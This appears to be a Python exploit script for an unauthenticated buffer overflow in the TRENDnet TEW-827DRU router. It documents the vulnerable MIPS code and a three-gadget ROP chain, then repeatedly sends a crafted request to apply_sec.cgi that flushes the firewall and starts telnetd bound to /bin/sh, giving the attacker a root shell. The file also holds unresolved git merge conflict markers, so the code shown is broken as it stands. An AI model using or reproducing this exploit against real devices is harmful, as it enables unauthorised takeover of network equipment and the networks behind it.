#!/usr/bin/python3
"""
This script exercises an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The server will perform a strcpy to the stack of any arguments passed in the URL whose destination is a valid .cgi,
.txt, .asp, or .js file. The vulnerable code within main is shown below.

LOAD:004107E4                 addiu   $v0, $fp, 0x1F0+var_108
LOAD:004107E8                 sw      $v0, 0x1F0+dest($fp)
LOAD:004107EC                 la      $v0, loc_4B0000
LOAD:004107F0                 nop
LOAD:004107F4                 addiu   $a0, $v0, (aQueryString - 0x4B0000)  # "QUERY_STRING"
LOAD:004107F8                 la      $v0, getenv
LOAD:004107FC                 nop
LOAD:00410800                 move    $t9, $v0
LOAD:00410804                 jalr    $t9 ; getenv
LOAD:00410808                 nop
LOAD:0041080C                 lw      $gp, 0x1F0+saved_gp($fp)
LOAD:00410810                 sw      $v0, 0x1F0+var_1AC($fp)
LOAD:00410814                 lw      $v0, 0x1F0+var_1AC($fp)
LOAD:00410818                 nop
LOAD:0041081C                 beqz    $v0, loc_4109B0
LOAD:00410820                 nop
LOAD:00410824                 lw      $v0, 0x1F0+var_1AC($fp)
LOAD:00410828                 lw      $a0, 0x1F0+dest($fp)  # dest
LOAD:0041082C                 move    $a1, $v0         # src
LOAD:00410830                 la      $v0, strcpy
LOAD:00410834                 nop
LOAD:00410838                 move    $t9, $v0
LOAD:0041083C                 jalr    $t9 ; strcpy

The cgi file that contains the exploit was compiled with library randomization enabled meaning the exploit must be
repeatedly thrown until libUClibc gets loaded at the address used as the base in the exploit. Sometimes this is quick,
sometimes it takes a few minutes.

The ROP chain used in the exploit is shown below.
 - rop1 - Because the exploit is in main we only have control of $fp and $ra, which is kinda hard to make a useful chain
          with. So the first rop give us control of registers $s0 - $s6.
 - rop2 - The address of system ends in 0x20, ASCII for space, which we can't directly send in the URL. So, we replace
          the 0x20 with 0x1C and use this gadget to increment the address of system to the proper address.
 - rop3 - Grab a string off the stack and call system with it.

---------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                |
---------------------------------------------------------------
| rop1        | 0x0003E164    | lw      $ra, 0x40+var_4($sp)  |
|             |               | lw      $s6, 0x40+var_8($sp)  |
|             |               | lw      $s5, 0x40+var_C($sp)  |
|             |               | lw      $s4, 0x40+var_10($sp) |
|             |               | lw      $s3, 0x40+var_14($sp) |
|             |               | lw      $s2, 0x40+var_18($sp) |
|             |               | lw      $s1, 0x40+var_1C($sp) |
|             |               | lw      $s0, 0x40+var_20($sp) |
|             |               | jr      $ra                   |
|             |               | addiu   $sp, 0x40             |
---------------------------------------------------------------
| rop2        | 0x00053168    | addiu   $s3, 4                |
|             |               | move    $t9, $s5              |
|             |               | jalr    $t9                   |
|             |               | lw      $a0, 0($s3)           |
---------------------------------------------------------------
| rop3        | 0x0003CA64    | addiu   $a0, $sp, 0x70+var_48 |
|             |               | li      $a1, 1                |
|             |               | move    $t9, $s3              |
|             |               | jalr    $t9                   |
|             |               | move    $a2, $s5              |
---------------------------------------------------------------

The overflow is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
<<<<<<< HEAD
import os
import mow
import signal
=======
import mow
import time
>>>>>>> 2c282b40d2ff01ce9d5b9758193133fb61a9820a
import argparse
import telnetlib


<<<<<<< HEAD
def ctrl_c_handler(_, __):
    """
    Handle ctrl-c so the program can exit.
    """
    os.kill(os.getpid(), 9)


=======
>>>>>>> 2c282b40d2ff01ce9d5b9758193133fb61a9820a
def telnet_connect(host, port):
    """
    Connect to telnet server.

    :param host: Telnet server IP address.
    :type host: str

    :param port: Telnet server listening port.
    :type port: int

    :return: Telnet session if connected or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def generate_exploit_packet(host, port, command):
    """
    Generate exploit packet to send to the router.

    :param host: Target IP address.
    :type host: str

    :param port: Target listening port.
    :type port: int

    :param command: Command to execute on successful exploitation.
    :type command: str

    :return: Packet to send to the target.
    """
    # All addresses are offsets in libuClibc-0.9.33.2.so
    rop1 = 0x3e164
    rop2 = 0x53168
    rop3 = 0x3ca64

    system = 0x57b1c

    overflow = mow.Overflow(0x108, 1, mow.LITTLE_ENDIAN, gadgets_base=0x76fd5000)
    overflow.ra = rop1
    overflow.add_to_stack(0x3c, address=rop2)
    overflow.add_to_stack(0x34, address=rop3)
    overflow.add_to_stack(0x2c, address=system)
    overflow.add_to_stack(0x68, command=command.replace(' ', '${IFS}'))
    overflow_string = overflow.generate()

    request = mow.CustomRequest(host, port, mow.GET, b'apply_sec.cgi?%s=asdf' % overflow_string)
    packet = request.create_packet()
    return packet


def exploit_target(host, port, telnet_port):
    """
    Repeatedly attempt to exploit the target until a reverse shell is established.

    :param host: Target ip.
    :type host: str

    :param port: Target port.
    :type port: int

    :param telnet_port: Telnet server port to open if exploitation succeeds.
    :type telnet_port: int

    :return:
    """
    telnet_command = 'iptables -F;telnetd -l /bin/sh -p %d' % telnet_port
    packet = generate_exploit_packet(host, port, telnet_command)

    print('Repeatedly throwing exploit...this may take some time. Shell will appear when it succeeds.')

    tn = telnet_connect(host, telnet_port)
    while tn is None:
        try:
            mow.send_packet(host, port, packet)
        except:
            continue
        tn = telnet_connect(host, telnet_port)

    tn.interact()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Unauthenticated buffer overflow processing query parameters in the '
                                                 'TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int,
                        default=5555)

    args = parser.parse_args()

<<<<<<< HEAD
    signal.signal(signal.SIGINT, ctrl_c_handler)

=======
>>>>>>> 2c282b40d2ff01ce9d5b9758193133fb61a9820a
    exploit_target(args.ip, args.port, args.tport)
